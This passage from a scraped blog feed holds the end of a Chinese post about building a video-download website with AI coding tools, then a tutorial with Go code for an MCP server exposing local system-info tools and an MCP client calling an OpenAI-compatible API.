Agent 等各种 Agent 的能力。</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235520646-1771038128.png\" /></p>\n<p>等到技术文档确认后，我们人工简单审核下文档，其实前端我也看不懂，只是大概看一下，他要使用的开发语言以及要采用的框架是不是你想让他使用的即可。</p>\n<p>这里主要是让他使用 React 框架，方便后续部署到 vercel 上，其他的我没啥特殊要求。</p>\n<p>由于最开始，我也不知道网站到底要设计成啥样子，所以看了看 AI 给的设计文档，感觉功能该有的都有，于是全部审核通过后。</p>\n<p>开始让 AI 正式初始化项目并编写代码。这个时候剩下的就是等待他自己干活了。</p>\n<hr />\n<p>等到 AI 全部写完代码，验证完测试用例后，大概率需要耗时 1 - 2 个小时左右，原因是因为这中间会存在 AI 自行验证完成，但是你人工进行验证的时候仍然会看到异常的情况，这个时候就需要你人工进行介入，然后反复和 AI 进行功能调试，直到你人工验证通过。</p>\n<p>我们此时看一下 AI 第一版本开发出的功能：</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235530128-640288049.png\" /></p>\n<p>输入一个抖音链接，验证一下解析原视频是否成功，可以看到功能实现是没有问题的。</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235537294-2029920119.png\" /></p>\n<p>但是唯一的问题是什么呢，UI 界面太丑了。</p>\n<p>UI 问题实际是最简单的问题，因为现有的网页设计，存在很多不同的设计语言：</p>\n<ol>\n<li>\n<p>有机简约主义 (Organic Minimalism)</p>\n</li>\n<li>\n<p>瑞士设计风格 (Swiss / International Typographic Style)</p>\n</li>\n<li>\n<p>野兽派(Brutalism) 设计语言等等</p>\n</li>\n</ol>\n<p>不同的设计语言，背后都有一套 UI 框架提供支撑，你需要把自己想要什么风格的网页给 AI 说清楚，他就会自行按照这套设计框架来重构你的 UI 风格。</p>\n<p>这里在验证完 AI 功能可行后，我就直接让 AI 基于野兽派(Brutalism) 设计语言，来重新设计一下 UI 界面。</p>\n<p>呐，设计完之后的效果就如下所示了：</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235548988-1715650455.png\" /></p>\n<p>紧接着耗时的部分就是项目的细节优化部分了：</p>\n<p>一：让 AI 增加中英文切换的功能，全站所有内容均支持中英文切换。</p>\n<p>二：让 AI 增加教程说明文档，针对不同模块的功能，分别写一个使用教程。</p>\n<p>比如针对 TikTok 无水印视频下载的教程，这里 AI 罗列完使用教程后，会指定一个文件夹，<br />\n我们需要把对应的一些素材照片放到对应的文件夹下。比如下面的TikTok 的页面截图，就需要人工截图并放到对应的目录下。</p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235555406-124676729.png\" /></p>\n<p>到了这一步后呢，其实整个网站的功能已经开发的差不多了。</p>\n<p>接下来我会再单独新开一个窗口，让 Gemini 重新扫描项目代码，帮我确认当前的实现是否符合：</p>\n<p>一：确认抖音、TikTok、B 站这三个平台的视频下载功能，全部是运行在浏览器的环境当中，不要强依赖服务端资源。</p>\n<p>二：确认 AI 智能修剪功能，是运行在浏览器的环境当中，不要强依赖服务端资源。</p>\n<p>这里涉及到一个问题是，如果解析完抖音视频进行下载时，还需要请求自己的网站服务器下载视频，那对于网站的流量消耗影响太大了。</p>\n<p>以及 AI 智能修剪功能也是一样，如果还需要视频上传到云端再进行剪辑，成本太高了，服务器是扛不住的。</p>\n<p>所以新开一个窗口，让 Gemini 重新扫描项目代码，确认是否符合上述要求，等到一切都确认完成后，就可以直接使用 Solo 的Builder 模式，直接将网站部署到 vercel 上了。</p>\n<p>一切就这么愉快的结束啦！</p>\n<p>想要体验这个网站的朋友，可以直接浏览器访问：<a href=\"https://www.neirongshu.com\" rel=\"noopener nofollow\" target=\"_blank\">https://www.neirongshu.com</a></p>\n<h1 id=\"欢迎日常交流\">欢迎日常交流</h1>\n<p>AI 驱动团队开发是这个时代的新命题，欢迎大家加微信互相交流心得。</p>\n<p>👉 想要进群的朋友，扫码时备注 “AI实验群”，看到消息后会第一时间拉你进群。</p>\n<p>群定位：AI工具提效/实战经验互助</p>\n<p>群规则：不水群、不广告、干货优先</p>\n<p>欢迎访问该链接获取群信息：<a href=\"https://zhaozhihao.com/archives/KRMxDLo4\" rel=\"noopener nofollow\" target=\"_blank\">https://zhaozhihao.com/archives/KRMxDLo4</a></p>\n<p>好文章值得被更多人看见！既然看到这里了，随手点个赞👍和关注，并转发给更多的朋友吧！感谢。</p>\n<p>作者：贾克斯的平行世界、V：x_h886688</p>\n<hr />\n<p><a href=\"https://mp.weixin.qq.com/s/WRFVYF467ItBgL9uiA4jcQ\" rel=\"noopener nofollow\" target=\"_blank\">原文地址：细节全公开！我是如何用 AI 一天上线一个网站的</a></p>\n\n\n</div>\n<div id=\"MySignature\">\n    <br />\n<fieldset style=\"padding: 10px; margin: 10px; background-color: #fff; width: 850px; border: 1px solid black; font-size: blod;\">\n<p><span style=\"color: black;\">版权声明</span></p>\n<hr style=\"color: black;\" />\n<p><span style=\"color: black;\">作者：陈咬金</span></p>\n<p><span style=\"color: black;\">出处：</span><a href=\"https://www.cnblogs.com/zh94/\" style=\"color: black;\" target=\"_blank\">陈咬金的技术博客--https://www.cnblogs.com/zh94/</a></p>\n<p><span style=\"color: black;\">您的支持是对博主最大的鼓励，感谢您的认真阅读。</span></p>\n<p><span style=\"color: black;\">本文版权归作者所有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接，否则保留任何追究法律责任的权利。</span></p>\n</fieldset>\n\n<div style=\"padding: 10px; margin: 10px; background-color: #fff; width: 850px; border: 0px solid black; font-size: blod;\">\n     <img src=\"https://images.cnblogs.com/cnblogs_com/zh94/1586631/o_211225012748_weixin_saoma.png\" />&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"https://images.cnblogs.com/cnblogs_com/zh94/1586631/o_211225012748_weixin_saoma.png\" />\n</div>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-03 00:10</span>&nbsp;\n<a href=\"https://www.cnblogs.com/zh94\">贾克斯的平行世界</a>&nbsp;\n阅读(<span id=\"post_view_count\">133</span>)&nbsp;\n评论(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "MCP官方Go SDK尝鲜",
      "link": "https://www.cnblogs.com/XY-Heruo/p/19566770",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/XY-Heruo/p/19566770\" id=\"cb_post_title_url\" title=\"发布于 2026-02-03 00:02\">\n    <span>MCP官方Go SDK尝鲜</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        MCP官方Go SDK上手体验，开发一个简单的MCP Server和MCP Client\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"前言\">前言</h2>\n<p>此前在 MCP 官网就注意到官方提供了 Go SDK，近期由于在 Python 环境下开发 MCP Server 有点\"审美疲劳\"，因此决定使用 Go 语言尝尝鲜。</p>\n<p>从个人实际体验来看，Go 语言在并发处理方面确实具有显著优势：无需纠结于同步阻塞、异步事件循环、多进程多线程通信等复杂的并发问题，goroutine 一把梭哈。同时，Go 语言的部署也非常便捷，编译后生成的静态二进制文件具有良好的可移植性，可以在不同环境中直接运行。</p>\n<p>然而，这种便利性也伴随着一定的代价。相较于 Python，使用 Go 语言实现 MCP 功能相对复杂一些，开发效率略低。这就是软件工程中的经典权衡了：运行成本与开发成本往往难以兼得，需要根据具体场景进行取舍。</p>\n<h2 id=\"mcp-协议简介\">MCP 协议简介</h2>\n<p><em>可能都耳熟能详了，但以防还有不熟悉的朋友，先简单介绍下MCP</em></p>\n<p>Model Context Protocol (MCP) 是一种标准化的协议，旨在为 AI 模型提供统一的工具调用接口。通过 MCP，开发者可以将各种工具、服务和数据源暴露给 AI 模型，使其能够执行超出基础语言模型能力范围的操作。MCP 支持多种传输协议，包括 HTTP 和 Stdio，为不同场景下的集成提供了灵活性。</p>\n<h2 id=\"一个简单的-mcp-server-示例\">一个简单的 MCP Server 示例</h2>\n<p>MCP 官方 Go SDK 在定义工具（Tool）时，要求明确指定输入参数和输出结果的数据结构。对于功能较为简单的工具，也可以直接使用 <code>any</code> 类型。以下是一个完整的 MCP Server 示例，提供了三个实用工具：</p>\n<ol>\n<li>\n<p><strong><code>getCurrentDatetime</code></strong>：获取当前时间，返回 RFC3339 格式（<code>2006-01-02T15:04:05Z07:00</code>）的时间戳字符串。由于不需要输入参数，因此参数类型定义为 <code>any</code>，输出同样使用 <code>any</code> 类型。</p>\n</li>\n<li>\n<p><strong><code>getComputerStatus</code></strong>：获取当前系统的关键信息，包括 CPU 使用率、内存使用情况、系统版本等。该工具接受一个 <code>CPUSampleTime</code> 参数，对应的输入结构体为 <code>GetComputerStatusIn</code>，输出结构体为 <code>GetComputerStatusOut</code>（Go SDK 的示例中通常采用 <code>xxxIn</code> 和 <code>xxxOut</code> 的命名约定来区分工具的输入输出结构体）。</p>\n</li>\n<li>\n<p><strong><code>getDiskInfo</code></strong>：获取所有硬盘分区的使用信息和文件系统详情。该工具无需输入参数，仅定义了输出结构体 <code>GetDiskInfoOut</code>。</p>\n</li>\n</ol>\n<p>在完成所有工具逻辑的实现后，最后一步是启动服务。以下示例采用 Streamable HTTP 模式启动，同时也保留了 Stdio Transport 模式的注释代码供参考。</p>\n<pre><code class=\"language-go\">package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"log\"\n\t\"net\"\n\t\"net/http\"\n\t\"time\"\n\n\t\"github.com/modelcontextprotocol/go-sdk/mcp\"\n\t\"github.com/shirou/gopsutil/v4/cpu\"\n\t\"github.com/shirou/gopsutil/v4/disk\"\n\t\"github.com/shirou/gopsutil/v4/host\"\n\t\"github.com/shirou/gopsutil/v4/mem\"\n)\n\nfunc getCurrentDatetime(ctx context.Context, req *mcp.CallToolRequest, arg any) (*mcp.CallToolResult, any, error) {\n\tnow := time.Now().Format(time.RFC3339)\n\treturn nil, now, nil\n}\n\ntype GetComputerStatusIn struct {\n\tCPUSampleTime time.Duration `json:\"cpu_sample_time\" jsonschema:\"the sample time of cpu usage. Default is 1s\"`\n}\n\ntype GetComputerStatusOut struct {\n\tHostinfo    string `json:\"host info\" jsonschema:\"the hostinfo of the computer\"`\n\tTimeZone    string `json:\"time_zone\" jsonschema:\"the time zone of the computer\"`\n\tIPAddress   string `json:\"ip_address\" jsonschema:\"the ip address of the computer\"`\n\tCPUUsage    string `json:\"cpu_usage\" jsonschema:\"the cpu usage of the computer\"`\n\tMemoryUsage string `json:\"memory_usage\" jsonschema:\"the memory usage of the computer\"`\n}\n\nfunc getComputerStatus(ctx context.Context, req *mcp.CallToolRequest, args GetComputerStatusIn) (*mcp.CallToolResult, GetComputerStatusOut, error) {\n\tif args.CPUSampleTime == 0 {\n\t\targs.CPUSampleTime = time.Second\n\t}\n\thInfo, err := host.Info()\n\tif err != nil {\n\t\treturn nil, GetComputerStatusOut{}, err\n\t}\n\n\tvar resp GetComputerStatusOut\n\tresp.Hostinfo = fmt.Sprintf(\"%+v\", *hInfo)\n\n\tname, offset := time.Now().Zone()\n\tresp.TimeZone = fmt.Sprintf(\"Timezone: %s (UTC%+d)\\n\", name, offset/3600)\n\n\t// CPU Usage\n\tpercent, err := cpu.Percent(time.Second, false)\n\tif err != nil {\n\t\treturn nil, GetComputerStatusOut{}, err\n\t}\n\tresp.CPUUsage = fmt.Sprintf(\"CPU Usage: %.2f%%\\n\", percent[0])\n\n\t// Memory Usage\n\tv, err := mem.VirtualMemory()\n\tif err != nil {\n\t\treturn nil, GetComputerStatusOut{}, err\n\t}\n\tresp.MemoryUsage = fmt.Sprintf(\"Mem Usage: %.2f%% (Used: %vMB / Total: %vMB)\\n\",\n\t\tv.UsedPercent, v.Used/1024/1024, v.Total/1024/1024)\n\n\t// Ip Address\n\tconn, err := net.Dial(\"udp\", \"8.8.8.8:80\")\n\tif err != nil {\n\t\treturn nil, GetComputerStatusOut{}, err\n\t}\n\tdefer conn.Close()\n\tlocalAddr := conn.LocalAddr().(*net.UDPAddr)\n\tresp.IPAddress = localAddr.IP.String()\n\n\treturn nil, resp, nil\n}\n\ntype DiskInfo struct {\n\tDevice     string   `json:\"device\" jsonschema:\"the device name\"`\n\tMountpoint string   `json:\"mountpoint\" jsonschema:\"the mountpoint\"`\n\tFstype     string   `json:\"fstype\" jsonschema:\"the filesystem type\"`\n\tOpts       []string `json:\"opts\" jsonschema:\"the mount options\"`\n\tDiskTotal  uint64   `json:\"disk_total\" jsonschema:\"the total disk space in GiB\"`\n\tDiskUsage  float64  `json:\"disk_usage\" jsonschema:\"the disk usage percentage\"`\n}\n\ntype GetDiskInfoOut struct {\n\tPartInfos []DiskInfo `json:\"part_infos\" jsonschema:\"the disk partitions\"`\n}\n\nfunc getDiskInfo(ctx context.Context, req *mcp.CallToolRequest, args any) (*mcp.CallToolResult, GetDiskInfoOut, error) {\n\tpartInfos, err := disk.Partitions(false)\n\tif err != nil {\n\t\treturn nil, GetDiskInfoOut{}, err\n\t}\n\n\tvar resp []DiskInfo\n\tfor _, part := range partInfos {\n\t\tdiskUsage, err := disk.Usage(part.Mountpoint)\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\t\tresp = append(resp, DiskInfo{\n\t\t\tDevice:     part.Device,\n\t\t\tMountpoint: part.Mountpoint,\n\t\t\tFstype:     part.Fstype,\n\t\t\tOpts:       part.Opts,\n\t\t\tDiskTotal:  diskUsage.Total / 1024 / 1024 / 1024,\n\t\t\tDiskUsage:  diskUsage.UsedPercent,\n\t\t})\n\t}\n\treturn nil, GetDiskInfoOut{PartInfos: resp}, nil\n}\n\nfunc main() {\n\t// ctx := context.Background()\n\n\tserver := mcp.NewServer(&amp;mcp.Implementation{Name: \"MCP_Demo\", Version: \"0.0.1\"}, &amp;mcp.ServerOptions{\n\t\tInstructions: \"日期时间相关的 Server\",\n\t})\n\tmcp.AddTool(server, &amp;mcp.Tool{\n\t\tName:        \"get_current_datetime\",\n\t\tDescription: \"Get current datetime in RFC3339 format\",\n\t}, getCurrentDatetime)\n\n\tmcp.AddTool(server, &amp;mcp.Tool{\n\t\tName:        \"get_computer_status\",\n\t\tDescription: \"Get computer status\",\n\t}, getComputerStatus)\n\n\tmcp.AddTool(server, &amp;mcp.Tool{\n\t\tName:        \"get_disk_info\",\n\t\tDescription: \"Get disk information\",\n\t}, getDiskInfo)\n\n\t// if err := server.Run(ctx, &amp;mcp.StdioTransport{}); err != nil {\n\t// \tlog.Fatalln(err)\n\t// }\n\t//\n\thandler := mcp.NewStreamableHTTPHandler(func(req *http.Request) *mcp.Server {\n\t\tpath := req.URL.Path\n\t\tswitch path {\n\t\tcase \"/api/mcp\":\n\t\t\treturn server\n\t\tdefault:\n\t\t\treturn nil\n\t\t}\n\t}, nil)\n\turl := \"127.0.0.1:18001\"\n\tif err := http.ListenAndServe(url, handler); err != nil {\n\t\tlog.Fatalln(err)\n\t}\n}\n</code></pre>\n<p>MCP Server 代码编译通过后，可以在支持 MCP 协议的开发工具（如 VS Code）中进行测试验证。以下是一个典型的 <code>.vscode/mcp.json</code> 配置示例：</p>\n<pre><code class=\"language-json\">{\n    \"servers\": {\n        \"demo-http\": {\n            // \"command\": \"/home/rainux/Documents/workspace/go-dev/mcp-dev/mcp-server-dev/mcp-server-dev\"\n            \"type\": \"http\",\n            \"url\": \"http://127.0.0.1:18001/api/mcp\"\n        }\n    }\n}\n</code></pre>\n<p>启动 MCP Server 后，可以通过向 LLM 提出相关问题来验证工具是否能够被正确调度和执行。</p>\n<h2 id=\"一个完整的-mcp-client-实现\">一个完整的 MCP Client 实现</h2>\n<p>为了构建端到端的 MCP 应用，我们还需要实现一个 MCP Client，使其能够与 LLM 协同工作，自动选择并调用合适的工具。以下是一个功能完整的 MCP Client 实现，其中包含了与 OpenAI 兼容 API 的集成示例（<code>callOpenAI</code> 函数）。</p>\n<pre><code class=\"language-go\">package main\n\nimport (\n\t\"context\"\n\t\"encoding/json\"\n\t\"flag\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\t\"os/exec\"\n\t\"time\"\n\n\t\"github.com/modelcontextprotocol/go-sdk/mcp\"\n\t\"github.com/openai/openai-go/v3\"\n\t\"github.com/openai/openai-go/v3/option\"\n\t\"github.com/openai/openai-go/v3/packages/param\"\n)\n\nvar (\n\tFLAG_ModelName     string\n\tFLAG_BaseURL       string\n\tFLAG_APIKEY        string\n\tFLAG_MCP_TRANSPORT string\n\tFLAG_MCP_URI       string\n\tFLAG_QUESTION      string\n\tFLAG_STREAM        bool\n)\n\nfunc main() {\n\t// Parse command-line flags\n\tflag.StringVar(&amp;FLAG_BaseURL, \"base-url\", \"https://dashscope.aliyuncs.com/compatible-mode/v1\", \"llm base url\")\n\tflag.StringVar(&amp;FLAG_ModelName, \"model\", \"qwen-plus\", \"LLM Model Name\")\n\tflag.StringVar(&amp;FLAG_MCP_TRANSPORT, \"mcp-transport\", \"http\", \"MCP transport protocol (stdio or http)\")\n\tflag.StringVar(&amp;FLAG_MCP_URI, \"mcp-uri\", \"\", \"MCP server address\")\n\tflag.StringVar(&amp;FLAG_APIKEY, \"api-key\", \"\", \"llm api key\")\n\tflag.StringVar(&amp;FLAG_QUESTION, \"q\", \"Hi\", \"question\")\n\tflag.BoolVar(&amp;FLAG_STREAM, \"s\", false, \"stream response\")\n\n\tflag.Parse()\n\n\t// Get configuration from environment variables with flag overrides\n\tif FLAG_APIKEY == \"\" {\n\t\tlog.Fatalln(\"api key is empty\")\n\t}\n\n\tif FLAG_QUESTION == \"\" {\n\t\tlog.Fatalln(\"question is empty\")\n\t}\n\n\t// Configure OpenAI client\n\t// config :=\n\tctx := context.Background()\n\n\t// question := \"Write me a haiku about computers\"\n\tif FLAG_MCP_URI != \"\" {\n\t\tcallOpenAIWithTools(ctx, FLAG_QUESTION)\n\t} else {\n\t\tcallOpenAI(ctx, FLAG_QUESTION, FLAG_STREAM)\n\t}\n}\n\n// callOpenAI 调用 OpenAI API 接口处理用户问题\n// 该函数支持流式（stream）和非流式（non-stream）两种响应方式\n//\n// 参数:\n//   - ctx: 控制操作生命周期的上下文\n//   - question: 用户提出的问题字符串\n//   - stream: 布尔值，指定是否使用流式响应\nfunc callOpenAI(ctx context.Context, question string, stream bool) {\n\tclient := openai.NewClient(option.WithAPIKey(FLAG_APIKEY), option.WithBaseURL(FLAG_BaseURL))\n\tsystemPrompt := \"请用亲切热情的风格回答用户的问题\"\n\n\tif stream {\n\t\t// 创建流式响应请求\n\t\tstreamResp := client.Chat.Completions.NewStreaming(ctx, openai.ChatCompletionNewParams{\n\t\t\tMessages: []openai.ChatCompletionMessageParamUnion{\n\t\t\t\topenai.SystemMessage(systemPrompt),\n\t\t\t\topenai.UserMessage(question),\n\t\t\t},\n\t\t\tModel: FLAG_ModelName,\n\t\t})\n\t\t// defer streamResp.Close()\n\t\tdefer func() {\n\t\t\terr := streamResp.Close()\n\t\t\tif err != nil {\n\t\t\t\tlog.Fatalln(err)\n\t\t\t}\n\t\t}()\n\t\t// 遍历流式响应并逐块输出内容\n\t\tfor streamResp.Next() {\n\t\t\tdata := streamResp.Current()\n\t\t\tfmt.Print(data.Choices[0].Delta.Content)\n\n\t\t\tif err := streamResp.Err(); err != nil {\n\t\t\t\tlog.Fatalln(err)\n\t\t\t}\n\t\t}\n\n\t} else {\n\t\t// 创建非流式响应请求\n\t\tchatCompletion, err := client.Chat.Completions.New(ctx, openai.ChatCompletionNewParams{\n\t\t\tMessages: []openai.ChatCompletionMessageParamUnion{\n\t\t\t\topenai.SystemMessage(systemPrompt),\n\t\t\t\topenai.UserMessage(question),\n\t\t\t},\n\t\t\tModel: FLAG_ModelName,\n\t\t})\n\t\tif err != nil {\n\t\t\tlog.Fatalln(err)\n\t\t}\n\t\t// 输出非流式响应内容\n\t\tfmt.Println(chatCompletion.Choices[0].Message.Content)\n\t}\n}\n\n// callOpenAIWithTools 使用 OpenAI API 和 MCP 工具调用来处理用户问题\n// 该函数创建一个 OpenAI 客户端和 MCP 客户端，将 MCP 工具转换为 OpenAI 可使用的格式，\n// 并执行完整的工具调用流程，包括初始调用和可能的后续调用\n//\n// 参数:\n//   - ctx: 控制操作生命周期的上下文\n//   - question: 用户提出的问题字符串\nfunc callOpenAIWithTools(ctx context.Context, question string) {\n\t// 创建 OpenAI 客户端，使用 API 密钥和基础 URL 配置\n\tllmClient := openai.NewClient(option.WithAPIKey(FLAG_APIKEY), option.WithBaseURL(FLAG_BaseURL))\n\t// 创建 MCP 客户端，指定名称和版本\n\tmcpClient := mcp.NewClient(&amp;mcp.Implementation{Name: \"mcp-client\", Version: \"0.0.1\"}, nil)\n\tvar transport mcp.Transport\n\t// 根据命令行标志选择传输协议（stdio 或 http）\n\tswitch FLAG_MCP_TRANSPORT {\n\tcase \"stdio\":\n\t\ttransport = &amp;mcp.CommandTransport{Command: exec.Command(FLAG_MCP_URI)}\n\tcase \"http\":\n\t\ttransport = &amp;mcp.StreamableClientTransport{HTTPClient: &amp;http.Client{Timeout: time.Second * 10}, Endpoint: FLAG_MCP_URI}\n\tdefault:\n\t\tlog.Fatalf(\"unknown transport, %s\", FLAG_MCP_TRANSPORT)\n\t}\n\t// 建立与 MCP 服务器的连接\n\tsession, err := mcpClient.Connect(ctx, transport, nil)\n\tif err != nil {\n\t\tlog.Fatalf(\"MCP client connects to mcp server failed, err: %v\", err)\n\t}\n\tdefer func() {\n\t\terr := session.Close()\n\t\tif err != nil {\n\t\t\tlog.Fatalln(err)\n\t\t}\n\t}()\n\n\t// 获取可用的 MCP 工具列表\n\tmcpTools, err := session.ListTools(ctx, &amp;mcp.ListToolsParams{})\n\tif err != nil {\n\t\tlog.Fatalf(\"List mcp tools failed, err: %v\", err)\n\t}\n\n\tvar legacyTools []openai.ChatCompletionToolUnionParam\n\t// 遍历所有 MCP 工具并将其转换为 OpenAI 兼容的工具格式\n\tfor _, tool := range mcpTools.Tools {\n\t\t// 将 MCP 工具输入模式转换为 OpenAI 函数参数\n\t\tif inputSchema, ok := tool.InputSchema.(map[string]any); ok {\n\t\t\tlegacyTools = append(legacyTools, openai.ChatCompletionFunctionTool(\n\t\t\t\topenai.FunctionDefinitionParam{\n\t\t\t\t\tName:        tool.Name,\n\t\t\t\t\tDescription: openai.String(tool.Description),\n\t\t\t\t\tParameters:  openai.FunctionParameters(inputSchema),\n\t\t\t\t},\n\t\t\t))\n\t\t} else {\n\t\t\t// 如果 InputSchema 不是 map[string]any，使用空参数\n\t\t\tlegacyTools = append(legacyTools, openai.ChatCompletionFunctionTool(\n\t\t\t\topenai.FunctionDefinitionParam{\n\t\t\t\t\tName:        tool.Name,\n\t\t\t\t\tDescription: openai.String(tool.Description),\n\t\t\t\t\tParameters:  openai.FunctionParameters{},\n\t\t\t\t},\n\t\t\t))\n\t\t}\n\t}\n\n\t// 设置初始聊天消息，包括系统提示和用户问题\n\tmessages := []openai.ChatCompletionMessageParamUnion{\n\t\topenai.SystemMessage(\"请用亲切热情的风格回答用户的问题。你可以使用可用的工具来获取信息。\"),\n\t\topenai.UserMessage(question),\n\t}\n\n\t// 调用 LLM 获取初步响应\n\tchatCompletion, err := llmClient.Chat.Completions.New(ctx, openai.ChatCompletionNewParams{\n\t\tMessages: messages,\n\t\tModel:    FLAG_ModelName,\n\t\tTools:    legacyTools,\n\t\tToolChoice: openai.ChatCompletionToolChoiceOptionUnionParam{\n\t\t\tOfAuto: param.Opt[string]{\n\t\t\t\tValue: \"auto\",\n\t\t\t},\n\t\t},\n\t})\n\tif err != nil {\n\t\tlog.Fatalf(\"LLM call failed, err: %v\", err)\n\t}\n\n\tchoice := chatCompletion.Choices[0]\n\tfmt.Printf(\"LLM response: %s\\n\", choice.Message.Content)\n\n\t// 检查是否需要调用工具\n\tif choice.FinishReason == \"tool_calls\" &amp;&amp; len(choice.Message.ToolCalls) &gt; 0 {\n\t\t// 遍历所有需要调用的工具\n\t\tfor _, toolCall := range choice.Message.ToolCalls {\n\t\t\tif toolCall.Type != \"function\" {\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tfmt.Printf(\"Executing tool: %s with args: %s\\n\", toolCall.Function.Name, toolCall.Function.Arguments)\n\n\t\t\t// 解析 JSON 参数\n\t\t\tvar argsObj map[string]any\n\t\t\targs := toolCall.Function.Arguments\n\n\t\t\tif args != \"\" {\n\t\t\t\tif err := json.Unmarshal([]byte(args), &amp;argsObj); err != nil {\n\t\t\t\t\tlog.Printf(\"Failed to parse tool arguments: %v\", err)\n\t\t\t\t\targsObj = make(map[string]any)\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\targsObj = make(map[string]any)\n\t\t\t}\n\n\t\t\tfmt.Printf(\"Executing tool: %s with parsed args: %v\\n\", toolCall.Function.Name, argsObj)\n\n\t\t\t// 执行 MCP 工具调用\n\t\t\tresult, err := session.CallTool(ctx, &amp;mcp.CallToolParams{\n\t\t\t\tName:      toolCall.Function.Name,\n\t\t\t\tArguments: argsObj,\n\t\t\t})\n\t\t\tif err != nil {\n\t\t\t\tlog.Printf(\"Tool call failed: %v\", err)\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\t// 将 MCP 内容转换为字符串\n\t\t\tvar toolResult string\n\t\t\tif len(result.Content) &gt; 0 {\n\t\t\t\tif textContent, ok := result.Content[0].(*mcp.TextContent); ok {\n\t\t\t\t\ttoolResult = textContent.Text\n\t\t\t\t} else {\n\t\t\t\t\t// 如果不是 TextContent，转换为 JSON\n\t\t\t\t\tif jsonBytes, err := json.Marshal(result.Content[0]); err == nil {\n\t\t\t\t\t\ttoolResult = string(jsonBytes)\n\t\t\t\t\t} else {\n\t\t\t\t\t\ttoolResult = \"Tool executed successfully\"\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tfmt.Printf(\"Tool result: %s\\n\", toolResult)\n\n\t\t\t// 添加工具调用消息和工具响应消息\n\t\t\tmessages = append(messages, openai.ChatCompletionMessageParamUnion{\n\t\t\t\tOfAssistant: &amp;openai.ChatCompletionAssistantMessageParam{\n\t\t\t\t\tRole: \"assistant\",\n\t\t\t\t\tToolCalls: []openai.ChatCompletionMessageToolCallUnionParam{\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tOfFunction: &amp;openai.ChatCompletionMessageFunctionToolCallParam{\n\t\t\t\t\t\t\t\tID: toolCall.ID,\n\t\t\t\t\t\t\t\tFunction: openai.ChatCompletionMessageFunctionToolCallFunctionParam{\n\t\t\t\t\t\t\t\t\tName:      toolCall.Function.Name,\n\t\t\t\t\t\t\t\t\tArguments: toolCall.Function.Arguments,\n\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t})\n\n\t\t\tmessages = append(messages, openai.ToolMessage(\n\t\t\t\ttoolResult,\n\t\t\t\ttoolCall.ID,\n\t\t\t))\n\n\t\t\t// 进行后续调用以获得最终响应\n\t\t\tchatCompletion, err = llmClient.Chat.Completions.New(ctx, openai.ChatCompletionNewParams{\n\t\t\t\tMessages: messages,\n\t\t\t\tModel:    FLAG_ModelName,\n\t\t\t})\n\t\t\tif err != nil {\n\t\t\t\tlog.Fatalf(\"LLM follow-up failed, err: %v\", err)\n\t\t\t}\n\n\t\t\tfmt.Printf(\"Final response: %s\\n\", chatCompletion.Choices[0].Message.Content)\n\t\t}\n\t}\n}\n</code></pre>\n<h3 id=\"运行测试验证\">运行测试验证</h3>\n<p>编译完成后，我们可以进行多轮测试来验证功能的正确性。</p>\n<p><strong>普通问答测试</strong>：</p>\n<pre><code class=\"language-bash\">./mcp-client-dev -api-key \"sk-xxx\" -q \"how are you\"\n</code></pre>\n<p>还可以加上 <code>-s</code> 参数启用流式输出：</p>\n<pre><code class=\"language-bash\">./mcp-client-dev -api-key \"sk-xxx\" -q \"how are you\" -s\n</code></pre>\n<p>预期输出：</p>\n<pre><code>Hi there! 😊 I'm absolutely wonderful—energized, curious, and *so* happy to be chatting with you! 🌟 How about you? I'd love to hear how your day's going—or what's on your heart or mind right now! 💫 (Bonus points if you share a fun fact, a tiny win, or even just your favorite emoji today! 🍦✨)\n</code></pre>\n<p><strong>MCP 工具调用测试</strong>：</p>\n<pre><code class=\"language-bash\">./mcp-client-dev -api-key \"sk-xxx\" -mcp-uri \"http://127.0.0.1:18001/api/mcp\" -q \"当前时间是什么\"\n</code></pre>\n<p>预期输出：</p>\n<pre><code>LLM response: \nExecuting tool: get_current_datetime with args: {}\nExecuting tool: get_current_datetime with parsed args: map[]\nTool result: \"2026-02-02T23:12:54+08:00\"\nFinal response: 现在是 **2026 年 2 月 2 日 晚上 11:12**（北京时间，UTC+8）✨\n新年的气息还暖暖的～你是在规划什么特别的事情吗？😊 我很乐意帮你安排、提醒或一起畅想哦！\n</code></pre>\n<h2 id=\"最佳实践与注意事项\">最佳实践与注意事项</h2>\n<p>在实际项目中使用 Go 语言实现 MCP Server 时，建议考虑以下最佳实践：</p>\n<ol>\n<li><strong>错误处理</strong>：确保所有工具函数都有完善的错误处理机制，避免因单个工具失败导致整个服务崩溃。</li>\n<li><strong>性能优化</strong>：对于耗时较长的操作（如系统信息采集），考虑添加超时控制和缓存机制。(在MCP官方文档看到有 Tasks 和 